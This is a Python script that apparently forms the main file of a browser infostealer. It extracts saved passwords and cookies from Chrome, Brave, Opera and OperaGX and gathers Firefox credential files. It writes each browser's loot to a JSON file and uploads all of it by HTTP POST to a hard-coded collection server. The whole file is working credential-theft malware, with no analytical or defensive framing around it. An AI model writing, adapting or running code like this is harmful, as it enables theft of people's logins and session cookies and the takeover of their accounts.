import Resources
from ChromiumDriller import Drill
import FirefoxDriller

import os
import requests
import json

SERVER = 'http://192.168.0.100:40389/upload'

files = []

firefoxPath = os.path.expandvars(Resources.Browsers['Firefox']['path'])

chromePath = os.path.expandvars(Resources.Browsers['Chrome']['path'])
chromeLogin = os.path.expandvars(Resources.Browsers['Chrome']['LoginData'])
chromeCookies = os.path.expandvars(Resources.Browsers['Chrome']['Cookies'])

bravePath = os.path.expandvars(Resources.Browsers['Brave']['path'])
braveLogin = os.path.expandvars(Resources.Browsers['Brave']['LoginData'])
braveCookies = os.path.expandvars(Resources.Browsers['Brave']['Cookies'])

operaPath = os.path.expandvars(Resources.Browsers['Opera']['path'])
operaLogin = os.path.expandvars(Resources.Browsers['Opera']['LoginData'])
operaCookies = os.path.expandvars(Resources.Browsers['Opera']['Cookies'])

operaGXPath = os.path.expandvars(Resources.Browsers['OperaGX']['path'])
operaGXLogin = os.path.expandvars(Resources.Browsers['OperaGX']['LoginData'])
operaGXCookies = os.path.expandvars(Resources.Browsers['OperaGX']['Cookies'])

# Chrome extraction
chromeDriller = Drill(chromePath, chromeLogin, chromeCookies)

pwd, cookies = chromeDriller.ExtractCredentials()
open('chromeData.json', 'w').write(json.dumps(
    {
        'passwords': json.dumps(pwd),
        'cookies': json.dumps(cookies)
    }
))
files.append(('files', open('chromeData.json', 'rb')))


# Brave extraction
braveDriller = Drill(bravePath, braveLogin, braveCookies)

pwd, cookies = braveDriller.ExtractCredentials()
open('braveData.json', 'w').write(json.dumps(
    {
        'passwords': json.dumps(pwd),
        'cookies': json.dumps(cookies)
    }
))
files.append(('files', open('braveData.json', 'rb')))

# Opera extraction
operaDriller = Drill(operaPath, operaLogin, operaCookies)

pwd, cookies = operaDriller.ExtractCredentials()
open('operaData.json', 'w').write(json.dumps(
    {
        'passwords': json.dumps(pwd),
        'cookies': json.dumps(cookies)
    }
))
files.append(('files', open('operaData.json', 'rb')))

# OperaGX extraction
operaGXDriller = Drill(operaGXPath, operaGXLogin, operaGXCookies)

pwd, cookies = operaGXDriller.ExtractCredentials()
open('operaGXData.json', 'w').write(json.dumps(
    {
        'passwords': json.dumps(pwd),
        'cookies': json.dumps(cookies)
    }
))
files.append(('files', open('operaGXData.json', 'rb')))

# Firefox extraction
firefoxDriller = FirefoxDriller.Drill(firefoxPath)
fireFiles = firefoxDriller.ExtractFiles()

for credFile in fireFiles:
    files.append(('files', open(credFile, 'rb')))

requests.post(url=SERVER, files=files)